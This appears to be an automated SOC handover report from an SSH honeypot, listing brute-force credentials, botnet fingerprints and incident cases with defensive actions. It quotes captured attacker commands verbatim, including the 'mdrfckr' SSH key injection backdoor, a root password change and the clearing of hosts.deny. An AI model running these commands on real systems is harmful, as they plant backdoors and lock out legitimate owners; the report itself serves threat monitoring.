# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-03 |
| **Generated At** | 2026-07-03T19:35:58Z |
| **Shift Time** | 19:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **173** |
| Confirmed Threats | **98** |
| False Positives Filtered | **75** (43.4%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **17** |
| High Severity Cases | **57** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **116** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **87** |
| Unique Credential Pairs | **41** |
| Unique Usernames | **13** |
| Unique Passwords | **37** |
| Successful Auth Pairs | **65** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 39 |
| `345gs5662d34` | 16 |
| `support` | 9 |
| `admin` | 9 |
| `ubuntu` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 16 |
| `3245gs5662d34` | 16 |
| `support` | 9 |
| `admin` | 7 |
| `123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `3245gs5662d34` | 13 |
| `support` | `support` | 9 |
| `admin` | `admin` | 7 |
| `ubuntu` | `abc#123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `jiayanghuang` | `jiayanghuang` | `45.198.224.120` | 2026-07-03T16:55:43 |
| `support` | `support` | `10.0.0.73` | 2026-07-03T16:56:17 |
| `elastic` | `123456` | `189.203.163.10` | 2026-07-03T16:58:17 |
| `345gs5662d34` | `345gs5662d34` | `189.203.163.10` | 2026-07-03T16:58:19 |
| `elastic` | `3245gs5662d34` | `189.203.163.10` | 2026-07-03T16:58:20 |
| `root` | `Qwe123456@` | `103.100.208.168` | 2026-07-03T17:00:53 |
| `345gs5662d34` | `345gs5662d34` | `103.100.208.168` | 2026-07-03T17:00:57 |
| `root` | `3245gs5662d34` | `103.100.208.168` | 2026-07-03T17:00:59 |
| `root` | `yuri` | `186.103.169.12` | 2026-07-03T17:02:12 |
| `345gs5662d34` | `345gs5662d34` | `186.103.169.12` | 2026-07-03T17:02:15 |
| `root` | `3245gs5662d34` | `186.103.169.12` | 2026-07-03T17:02:16 |
| `admin` | `netup123` | `190.181.27.37` | 2026-07-03T17:02:52 |
| `345gs5662d34` | `345gs5662d34` | `190.181.27.37` | 2026-07-03T17:02:55 |
| `admin` | `3245gs5662d34` | `190.181.27.37` | 2026-07-03T17:02:56 |
| `root` | `Abc@123654` | `64.225.17.153` | 2026-07-03T17:03:30 |
| `345gs5662d34` | `345gs5662d34` | `64.225.17.153` | 2026-07-03T17:03:32 |
| `root` | `3245gs5662d34` | `64.225.17.153` | 2026-07-03T17:03:32 |
| `ubuntu` | `password12345678` | `45.198.224.120` | 2026-07-03T17:07:01 |
| `admin` | `admin` | `223.84.239.151` | 2026-07-03T17:11:14 |
| `root` | `!@WQ12wq` | `120.48.54.170` | 2026-07-03T17:13:23 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-03T17:16:26 |
| `brian` | `brian` | `45.198.224.120` | 2026-07-03T17:18:18 |
| `support` | `support` | `176.53.159.197` | 2026-07-03T17:25:28 |
| `guest` | `princess` | `45.198.224.120` | 2026-07-03T17:29:29 |
| `ubuntu` | `abc#123` | `185.242.3.195` | 2026-07-03T17:31:31 |
| `ubuntu` | `abc#123` | `10.0.0.73` | 2026-07-03T17:35:14 |
| `ubuntu` | `user1234567` | `45.198.224.120` | 2026-07-03T17:40:42 |
| `ilearn` | `123456` | `168.76.131.178` | 2026-07-03T17:42:15 |
| `345gs5662d34` | `345gs5662d34` | `168.76.131.178` | 2026-07-03T17:42:19 |
| `ilearn` | `3245gs5662d34` | `168.76.131.178` | 2026-07-03T17:42:20 |
| `root` | `R4e3w2q1` | `196.189.155.89` | 2026-07-03T17:46:39 |
| `345gs5662d34` | `345gs5662d34` | `196.189.155.89` | 2026-07-03T17:46:42 |
| `root` | `3245gs5662d34` | `196.189.155.89` | 2026-07-03T17:46:43 |
| `root` | `a1b2c3!@#` | `195.86.192.66` | 2026-07-03T17:51:28 |
| `345gs5662d34` | `345gs5662d34` | `195.86.192.66` | 2026-07-03T17:51:32 |
| `root` | `3245gs5662d34` | `195.86.192.66` | 2026-07-03T17:51:34 |
| `root` | `liverpool` | `45.198.224.120` | 2026-07-03T17:51:45 |
| `root` | `Admin2005` | `213.230.127.104` | 2026-07-03T18:01:25 |
| `345gs5662d34` | `345gs5662d34` | `213.230.127.104` | 2026-07-03T18:01:29 |
| `root` | `3245gs5662d34` | `213.230.127.104` | 2026-07-03T18:01:30 |
| `postgres` | `password1` | `45.198.224.120` | 2026-07-03T18:02:43 |
| `root` | `` | `91.92.40.90` | 2026-07-03T18:08:43 |
| `root1` | `root` | `128.199.225.7` | 2026-07-03T18:13:12 |
| `root` | `Qwsx000#` | `45.198.224.120` | 2026-07-03T18:13:39 |
| `admin` | `admin` | `45.148.10.121` | 2026-07-03T18:24:08 |
| `confluence6` | `confluence6` | `45.198.224.120` | 2026-07-03T18:25:24 |
| `root` | `qwe` | `185.242.3.195` | 2026-07-03T18:26:22 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-03T18:37:00 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-03T18:37:00 |
| `root` | `P@ssworD` | `45.198.224.120` | 2026-07-03T18:37:18 |
| `root` | `asda123` | `2.26.64.73` | 2026-07-03T18:46:12 |
| `345gs5662d34` | `345gs5662d34` | `2.26.64.73` | 2026-07-03T18:46:14 |
| `root` | `3245gs5662d34` | `2.26.64.73` | 2026-07-03T18:46:15 |
| `support` | `support` | `176.53.159.196` | 2026-07-03T18:46:47 |
| `root` | `1212312121` | `10.0.0.73` | 2026-07-03T18:47:40 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-03T18:47:43 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T18:47:44 |
| `root` | `1QAZ2WSX` | `10.0.0.73` | 2026-07-03T18:48:24 |
| `root` | `0123456` | `45.198.224.120` | 2026-07-03T18:48:29 |
| `root` | `admin!@#321` | `10.0.0.73` | 2026-07-03T18:48:30 |
| `root` | `smart123` | `10.0.0.73` | 2026-07-03T18:50:48 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-03T18:52:11 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-03T18:52:11 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-03T18:52:20 |
| `root` | `rootdb` | `10.0.0.73` | 2026-07-03T18:54:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **173** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 42 |
| Go SSH scanner | 19 |
| Paramiko (Python) | 6 |
| Generic SSH/2.0 | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 31 | 11 |
| `16443846184e...` | Generic scanner | 13 | 2 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 1 |
| `bf7dbf67fa9b...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 31 | 11 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 13 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 10 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `2a86d5946159...` | Generic SSH/2.0 | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:5fpA1MG4YteU"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.54.170`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `91.92.40.90`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `189.203.163.10`, `195.86.192.66`, `2.26.64.73`, `196.189.155.89`, `190.181.27.37`, `64.225.17.153`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **31** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS154383` | ZORNTECH WEB SOLUTIONS | 2 | HIGH |
| `AS984` | OCTOPUS WEB SOLUTION INC | 1 | HIGH |
| `AS210546` | CHSL ONE LTD | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (57)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2dfcd374db19

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 16:55 |
| **Last Seen** | 2026-07-03 16:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 16:55:35` | `cowrie.session.connect` |
| `2026-07-03 16:55:36` | `cowrie.client.version` |
| `2026-07-03 16:55:36` | `cowrie.client.kex` |
| `2026-07-03 16:55:43` | `cowrie.login.success` |
| `2026-07-03 16:55:46` | `cowrie.session.params` |
| `2026-07-03 16:55:46` | `cowrie.command.input` |
| `2026-07-03 16:55:47` | `cowrie.log.closed` |
| `2026-07-03 16:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-597f7076042d

| Field | Detail |
|---|---|
| **Source IP** | `189.203.163[.]10` |
| **First Seen** | 2026-07-03 16:58 |
| **Last Seen** | 2026-07-03 16:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 16:58:17` | `cowrie.session.connect` |
| `2026-07-03 16:58:17` | `cowrie.client.version` |
| `2026-07-03 16:58:17` | `cowrie.client.kex` |
| `2026-07-03 16:58:17` | `cowrie.login.success` |
| `2026-07-03 16:58:18` | `cowrie.session.params` |
| `2026-07-03 16:58:18` | `cowrie.command.input` |
| `2026-07-03 16:58:18` | `cowrie.command.failed` |
| `2026-07-03 16:58:18` | `cowrie.log.closed` |
| `2026-07-03 16:58:19` | `cowrie.session.params` |
| `2026-07-03 16:58:19` | `cowrie.command.input` |
| `2026-07-03 16:58:19` | `cowrie.session.file_download` |
| `2026-07-03 16:58:19` | `cowrie.log.closed` |
| `2026-07-03 16:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.203.163[.]10` to AbuseIPDB if not already reported
- [ ] Block `189.203.163[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebe23c0a7f98

| Field | Detail |
|---|---|
| **Source IP** | `189.203.163[.]10` |
| **First Seen** | 2026-07-03 16:58 |
| **Last Seen** | 2026-07-03 16:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 16:58:19` | `cowrie.session.connect` |
| `2026-07-03 16:58:19` | `cowrie.client.version` |
| `2026-07-03 16:58:19` | `cowrie.client.kex` |
| `2026-07-03 16:58:19` | `cowrie.login.success` |
| `2026-07-03 16:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.203.163[.]10` to AbuseIPDB if not already reported
- [ ] Block `189.203.163[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fd84150f6e4

| Field | Detail |
|---|---|
| **Source IP** | `189.203.163[.]10` |
| **First Seen** | 2026-07-03 16:58 |
| **Last Seen** | 2026-07-03 16:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 16:58:19` | `cowrie.session.connect` |
| `2026-07-03 16:58:19` | `cowrie.client.version` |
| `2026-07-03 16:58:19` | `cowrie.client.kex` |
| `2026-07-03 16:58:20` | `cowrie.login.success` |
| `2026-07-03 16:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.203.163[.]10` to AbuseIPDB if not already reported
- [ ] Block `189.203.163[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-236d2a082ac6

| Field | Detail |
|---|---|
| **Source IP** | `103.100.208[.]168` |
| **First Seen** | 2026-07-03 17:00 |
| **Last Seen** | 2026-07-03 17:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:00:52` | `cowrie.session.connect` |
| `2026-07-03 17:00:52` | `cowrie.client.version` |
| `2026-07-03 17:00:53` | `cowrie.client.kex` |
| `2026-07-03 17:00:53` | `cowrie.login.success` |
| `2026-07-03 17:00:54` | `cowrie.session.params` |
| `2026-07-03 17:00:54` | `cowrie.command.input` |
| `2026-07-03 17:00:54` | `cowrie.command.failed` |
| `2026-07-03 17:00:55` | `cowrie.log.closed` |
| `2026-07-03 17:00:56` | `cowrie.session.params` |
| `2026-07-03 17:00:56` | `cowrie.command.input` |
| `2026-07-03 17:00:56` | `cowrie.session.file_download` |
| `2026-07-03 17:00:56` | `cowrie.log.closed` |
| `2026-07-03 17:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.100.208[.]168` to AbuseIPDB if not already reported
- [ ] Block `103.100.208[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42b942cf0001

| Field | Detail |
|---|---|
| **Source IP** | `103.100.208[.]168` |
| **First Seen** | 2026-07-03 17:00 |
| **Last Seen** | 2026-07-03 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:00:56` | `cowrie.session.connect` |
| `2026-07-03 17:00:56` | `cowrie.client.version` |
| `2026-07-03 17:00:56` | `cowrie.client.kex` |
| `2026-07-03 17:00:57` | `cowrie.login.success` |
| `2026-07-03 17:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.100.208[.]168` to AbuseIPDB if not already reported
- [ ] Block `103.100.208[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e58a875250d

| Field | Detail |
|---|---|
| **Source IP** | `103.100.208[.]168` |
| **First Seen** | 2026-07-03 17:00 |
| **Last Seen** | 2026-07-03 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:00:58` | `cowrie.session.connect` |
| `2026-07-03 17:00:58` | `cowrie.client.version` |
| `2026-07-03 17:00:58` | `cowrie.client.kex` |
| `2026-07-03 17:00:59` | `cowrie.login.success` |
| `2026-07-03 17:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.100.208[.]168` to AbuseIPDB if not already reported
- [ ] Block `103.100.208[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d1ef2f51b6d

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-07-03 17:02 |
| **Last Seen** | 2026-07-03 17:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:02:12` | `cowrie.session.connect` |
| `2026-07-03 17:02:12` | `cowrie.client.version` |
| `2026-07-03 17:02:12` | `cowrie.client.kex` |
| `2026-07-03 17:02:12` | `cowrie.login.success` |
| `2026-07-03 17:02:13` | `cowrie.session.params` |
| `2026-07-03 17:02:13` | `cowrie.command.input` |
| `2026-07-03 17:02:13` | `cowrie.command.failed` |
| `2026-07-03 17:02:14` | `cowrie.log.closed` |
| `2026-07-03 17:02:14` | `cowrie.session.params` |
| `2026-07-03 17:02:14` | `cowrie.command.input` |
| `2026-07-03 17:02:14` | `cowrie.session.file_download` |
| `2026-07-03 17:02:14` | `cowrie.log.closed` |
| `2026-07-03 17:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b27a3b0296b

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-07-03 17:02 |
| **Last Seen** | 2026-07-03 17:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:02:14` | `cowrie.session.connect` |
| `2026-07-03 17:02:14` | `cowrie.client.version` |
| `2026-07-03 17:02:15` | `cowrie.client.kex` |
| `2026-07-03 17:02:15` | `cowrie.login.success` |
| `2026-07-03 17:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d6846d0a60f

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-07-03 17:02 |
| **Last Seen** | 2026-07-03 17:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:02:15` | `cowrie.session.connect` |
| `2026-07-03 17:02:15` | `cowrie.client.version` |
| `2026-07-03 17:02:15` | `cowrie.client.kex` |
| `2026-07-03 17:02:16` | `cowrie.login.success` |
| `2026-07-03 17:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d98d10016aef

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]37` |
| **First Seen** | 2026-07-03 17:02 |
| **Last Seen** | 2026-07-03 17:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:02:51` | `cowrie.session.connect` |
| `2026-07-03 17:02:51` | `cowrie.client.version` |
| `2026-07-03 17:02:51` | `cowrie.client.kex` |
| `2026-07-03 17:02:52` | `cowrie.login.success` |
| `2026-07-03 17:02:53` | `cowrie.session.params` |
| `2026-07-03 17:02:53` | `cowrie.command.input` |
| `2026-07-03 17:02:53` | `cowrie.command.failed` |
| `2026-07-03 17:02:53` | `cowrie.log.closed` |
| `2026-07-03 17:02:54` | `cowrie.session.params` |
| `2026-07-03 17:02:54` | `cowrie.command.input` |
| `2026-07-03 17:02:54` | `cowrie.session.file_download` |
| `2026-07-03 17:02:54` | `cowrie.log.closed` |
| `2026-07-03 17:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]37` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

